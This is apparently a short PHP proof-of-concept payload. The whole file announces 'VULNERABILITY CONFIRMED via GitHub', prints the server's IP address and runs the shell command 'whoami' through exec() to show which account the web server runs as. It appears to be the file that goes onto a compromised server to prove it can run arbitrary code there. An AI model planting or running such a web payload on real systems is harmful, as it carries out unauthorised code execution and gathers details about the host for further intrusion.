<?php
echo "<h1>VULNERABILITY CONFIRMED via GitHub</h1>";
echo "Server IP: " . $_SERVER['SERVER_ADDR'];
echo "<br>User: " . exec('whoami');
?>
